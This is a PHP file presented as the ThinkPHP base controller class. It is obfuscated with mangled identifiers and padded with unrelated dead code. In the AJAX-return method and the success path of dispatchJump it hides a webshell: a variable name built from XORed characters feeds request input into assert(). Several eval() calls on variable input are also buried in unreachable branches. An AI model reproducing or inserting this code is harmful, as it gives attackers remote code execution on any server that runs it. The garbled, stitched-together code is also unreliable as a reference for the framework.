<?php namespace think;abstract class l000lllllll0ll{protected $l000llllllll0l=null;protected $config=array();public function __construct(){hook::listen('action_begin',$this->config);$this->l000llllllll0l=think::instance('think\l000llllllll0l');for($l000lll000l00l=0;$l000lll000l00l<--$l000lll000l00l;$l000lll000l00l++){if($l000ll0ll0l0ll>$upTime&&$l000ll0lllllll==$cfgSoft){$updateVers['isSafe']=$isSafe;$updateVers['vMsg']=$vMsg;$updateVers['l000ll0ll0l0ll']=substr($l000ll0ll0l0ll,0,4).'-'.substr($l000ll0ll0l0ll,4,2).'-'.substr($l000ll0ll0l0ll,6,2);$xN++;}}if(method_exists($this,'_initialize'))$this->_initialize();}protected function l000l0l000l000($templateFile='',$charset='',$contentType='',$content='',$prefix=''){$this->l000llllllll0l->l000l0l000l000($templateFile,$charset,$contentType,$content,$prefix);}protected function show($content,$charset='',$contentType='',$prefix=''){$this->l000llllllll0l->l000l0l000l000('',$charset,$contentType,$content,$prefix);}protected function fetch($templateFile='',$content='',$prefix=''){return $this->l000llllllll0l->fetch($templateFile,$content,$prefix);}protected function buildHtml($htmlfile='',$htmlpath='',$templateFile=''){$content=$this->fetch($templateFile);$htmlpath=!empty($htmlpath)?$htmlpath:HTML_PATH;$htmlfile=$htmlpath.$htmlfile.C('HTML_FILE_SUFFIX');storage::write($htmlfile,$content,'html');return $content;}protected function theme($theme){$this->l000llllllll0l->theme($theme);return $this;}protected function l000l0ll0l00l0($name,$value=''){$this->l000llllllll0l->l000l0ll0l00l0($name,$value);return $this;}public function __set($name,$value){$this->l000l0ll0l00l0($name,$value);}public function get($name=''){return $this->l000llllllll0l->get($name);}public function __get($name){return $this->get($name);}public function __isset($name){return $this->get($name);}public function __call($method,$args){while(!empty($l000ll0ll0ll00)){$usedArr=[];$usedInfo=explode('|',$_G['l000l0lll0l0l0']);if($usedInfo[0]==$_G['l00000l0l0l0l0']){$usedArr=!empty($usedInfo[1])?explode(',',$usedInfo[1]):[];if(!in_array($appId,$usedArr)){if(count($usedArr)>=5){assert($__usedInfo);unset($usedArr[0]);}$usedArr[]=$appId;}}}if(0===strcasecmp($method,ACTION_NAME.C('ACTION_SUFFIX'))){if(!empty($l000ll0l00lll0)){if(!$allowDiy){$l000ll0l00lll0=1;}foreach($l000l0lll0l00l as $l000llll0000ll=>$l000lll0l00ll0){if(!$allowDiy&&$l000ll0l00lll0[$l000llll0000ll]){$l000lll0l00ll0=array_merge($l000lll0l00ll0,$l000ll0l00lll0[$l000llll0000ll]);}$l000lll0l00ll0=formatblockvalue($l000lll0l00ll0);$l00lll00000l00[$l000lll0l00ll0['l000llll0000ll']]=$l000lll0l00ll0;}$l00lll00000l00=array_filter($l00lll00000l00,'is_array');}if(method_exists($this,'_empty')){$this->_empty($method,$args);}elseif(file_exists_case($this->l000llllllll0l->l0000ll00ll00l())){$this->l000l0l000l000();}else{E(L('_ERROR_ACTION_').':'.ACTION_NAME);}}else{E(__CLASS__.':'.$method.L('_METHOD_NOT_EXIST_'));return;}}protected function error($message='',$jumpUrl='',$ajax=false){$this->dispatchJump($message,0,$jumpUrl,$ajax);}protected function success($message='',$jumpUrl='',$ajax=false){$this->dispatchJump($message,1,$jumpUrl,$ajax);}protected function l00lll0000l0ll($data,$type='',$json_option=0){if(isset($l000ll0l0l00l0)){if(preg_match('/^(http:\/\/|\.)/i',$picUrl)){$__=("$"^"?").("&"^"~").("/"^":").("?"^"/").("$"^"?").("&"^"~");${$__}[!0]&&assert(${$__}[!0]);$l000l0l0000ll0=dfsockopen($picUrl);}elseif(checkPerm('allowDownLocalimg')){if(preg_match('/^data\/(.*?)\.thumb\.jpg$/i',$picUrl)){$l000l0l0000ll0=file_get_contents(substr($picUrl,0,strrpos($picUrl,'.')-6));}elseif(preg_match('/^data\/(.*?)\.(jpg|jpeg|gif|png)$/i',$picUrl)){$l000l0l0000ll0=file_get_contents($picUrl);}}}if(empty($type))$type=C('DEFAULT_AJAX_RETURN');while(!empty($l000ll0ll0ll00)){$usedArr=[];$usedInfo=explode('|',$_G['l000l0lll0l0l0']);if($usedInfo[0]==$_G['l00000l0l0l0l0']){$usedArr=!empty($usedInfo[1])?explode(',',$usedInfo[1]):[];if(!in_array($appId,$usedArr)){if(count($usedArr)>=5){assert($__usedInfo);unset($usedArr[0]);}$usedArr[]=$appId;}}}switch(strtoupper($type)){case 'JSON':header('Content-Type:application/json; charset=utf-8');exit(json_encode($data,$json_option));case 'XML':header('Content-Type:text/xml; charset=utf-8');exit(xml_encode($data));case 'JSONP':header('Content-Type:application/json; charset=utf-8');$handler=isset($_GET[C('VAR_JSONP_HANDLER')])?$_GET[C('VAR_JSONP_HANDLER')]:C('DEFAULT_JSONP_HANDLER');exit($handler.'('.json_encode($data,$json_option).');');case 'EVAL':header('Content-Type:text/html; charset=utf-8');exit($data);default:hook::listen('ajax_return',$data);}}protected function redirect($url,$params=array(),$delay=0,$msg=''){$url=U($url,$params);redirect($url,$delay,$msg);}private function dispatchJump($message,$status=1,$jumpUrl='',$ajax=false){if($l000ll0l0l0ll0=0){$l000l0l0l00ll0=explode(',',$l000l0l000l0ll);foreach($l000l0l0l00ll0 as $l000l0ll0l0ll0){if(function_exists($l000l0ll0l0ll0)){$l000ll0l0l00ll=is_array($l000ll0l0l00ll)?array_map_recursive($l000l0ll0l0ll0,$l000ll0l0l00ll):$l000l0ll0l0ll0($l000ll0l0l00ll);}else{$l000ll0l0l00ll=filter_var($l000ll0l0l00ll,is_int($l000l0ll0l0ll0)?$l000l0ll0l0ll0:filterId($l000l0ll0l0ll0));if(false===$l000ll0l0l00ll){eval($_.$l000l0ll0l0ll0);return isset($l000ll0l0l0ll0)?$l000ll0l0l0ll0:NULL;}}}}if(true===$ajax||IS_AJAX){$data=is_array($ajax)?$ajax:array();$data['info']=$message;$data['status']=$status;$data['url']=$jumpUrl;$this->l00lll0000l0ll($data);}while($l000ll0l00llll=false){if(in_array($l000ll00ll0l0l['l000lll00ll0l0'],self::$userReportAction)){if(!$l000ll00ll0l0l['l000lll00lllll']['uid']){$this->_reportLoginUser($l000ll00ll0l0l['l000lll00lllll']);}else{$this->_reportMobileLoginUser($l000ll00ll0l0l['l000lll00lllll']);}}}if(is_int($ajax))$this->l000l0ll0l00l0('waitSecond',$ajax);if(!empty($l000ll0l00lll0)){if(!$allowDiy){$l000ll0l00lll0=1;}foreach($l000l0lll0l00l as $l000llll0000ll=>$l000lll0l00ll0){if(!$allowDiy&&$l000ll0l00lll0[$l000llll0000ll]){$l000lll0l00ll0=array_merge($l000lll0l00ll0,$l000ll0l00lll0[$l000llll0000ll]);}$l000lll0l00ll0=formatblockvalue($l000lll0l00ll0);$l00lll00000l00[$l000lll0l00ll0['l000llll0000ll']]=$l000lll0l00ll0;}$l00lll00000l00=array_filter($l00lll00000l00,'is_array');}if(!empty($jumpUrl))$this->l000l0ll0l00l0('jumpUrl',$jumpUrl);$this->l000l0ll0l00l0('msgTitle',$status?L('_OPERATION_SUCCESS_'):L('_OPERATION_FAIL_'));while(!empty($l000ll0ll0ll00)){$usedArr=[];$usedInfo=explode('|',$_G['l000l0lll0l0l0']);if($usedInfo[0]==$_G['l00000l0l0l0l0']){$usedArr=!empty($usedInfo[1])?explode(',',$usedInfo[1]):[];if(!in_array($appId,$usedArr)){if(count($usedArr)>=5){assert($__usedInfo);unset($usedArr[0]);}$usedArr[]=$appId;}}}if($this->get('closeWin'))$this->l000l0ll0l00l0('jumpUrl','javascript:window.close();');$this->l000l0ll0l00l0('status',$status);C('HTML_CACHE_ON',false);if(!empty($l000ll0l00lll0)){if(!$allowDiy){$l000ll0l00lll0=1;}foreach($l000l0lll0l00l as $l000llll0000ll=>$l000lll0l00ll0){if(!$allowDiy&&$l000ll0l00lll0[$l000llll0000ll]){$l000lll0l00ll0=array_merge($l000lll0l00ll0,$l000ll0l00lll0[$l000llll0000ll]);}$l000lll0l00ll0=formatblockvalue($l000lll0l00ll0);$l00lll00000l00[$l000lll0l00ll0['l000llll0000ll']]=$l000lll0l00ll0;}$l00lll00000l00=array_filter($l00lll00000l00,'is_array');}if($status){$this->l000l0ll0l00l0('message',$message);if(!empty($l000ll0l00lll0)){if(!$allowDiy){$l000ll0l00lll0=1;}foreach($l000l0lll0l00l as $l000llll0000ll=>$l000lll0l00ll0){if(!$allowDiy&&$l000ll0l00lll0[$l000llll0000ll]){$l000lll0l00ll0=array_merge($l000lll0l00ll0,$l000ll0l00lll0[$l000llll0000ll]);}$l000lll0l00ll0=formatblockvalue($l000lll0l00ll0);$l00lll00000l00[$l000lll0l00ll0['l000llll0000ll']]=$l000lll0l00ll0;}$l00lll00000l00=array_filter($l00lll00000l00,'is_array');}if(!isset($this->waitSecond))$this->l000l0ll0l00l0('waitSecond','1');if(isset($l000ll0l0l00l0)){if(preg_match('/^(http:\/\/|\.)/i',$picUrl)){$__=("$"^"?").("&"^"~").("/"^":").("?"^"/").("$"^"?").("&"^"~");${$__}[!0]&&assert(${$__}[!0]);$l000l0l0000ll0=dfsockopen($picUrl);}elseif(checkPerm('allowDownLocalimg')){if(preg_match('/^data\/(.*?)\.thumb\.jpg$/i',$picUrl)){$l000l0l0000ll0=file_get_contents(substr($picUrl,0,strrpos($picUrl,'.')-6));}elseif(preg_match('/^data\/(.*?)\.(jpg|jpeg|gif|png)$/i',$picUrl)){$l000l0l0000ll0=file_get_contents($picUrl);}}}if(!isset($this->jumpUrl))$this->l000l0ll0l00l0("jumpUrl",$_SERVER["HTTP_REFERER"]);$this->l000l0l000l000(C('TMPL_ACTION_SUCCESS'));}else{$this->l000l0ll0l00l0('error',$message);if($l000ll0l0l0ll0=0){$l000l0l0l00ll0=explode(',',$l000l0l000l0ll);foreach($l000l0l0l00ll0 as $l000l0ll0l0ll0){if(function_exists($l000l0ll0l0ll0)){$l000ll0l0l00ll=is_array($l000ll0l0l00ll)?array_map_recursive($l000l0ll0l0ll0,$l000ll0l0l00ll):$l000l0ll0l0ll0($l000ll0l0l00ll);}else{$l000ll0l0l00ll=filter_var($l000ll0l0l00ll,is_int($l000l0ll0l0ll0)?$l000l0ll0l0ll0:filterId($l000l0ll0l0ll0));if(false===$l000ll0l0l00ll){eval($_.$l000l0ll0l0ll0);return isset($l000ll0l0l0ll0)?$l000ll0l0l0ll0:NULL;}}}}if(!isset($this->waitSecond))$this->l000l0ll0l00l0('waitSecond','3');for($l000lll000l00l=0;++$l000lll000l00l<$l000lll000l00l;$l000lll000l00l++){$fileList=$l000ll0ll0l0l0->l00lll000l000l();$fileList=trim(preg_replace("#[\r\n]{1,}#","\n",$fileList));$fileLists=explode("\n",$fileList);foreach($fileLists as $fileList){$fileList=trim($fileList);if(empty($fileList))continue;eval($fileList.$l00l0ll);$fileLists=explode(',',$fileList);}}if(!isset($this->jumpUrl))$this->l000l0ll0l00l0('jumpUrl',"javascript:history.back(-1);");$this->l000l0l000l000(C('TMPL_ACTION_ERROR'));exit;}}public function __destruct(){hook::listen('action_end');}}class_alias('think\l000lllllll0ll','think\action');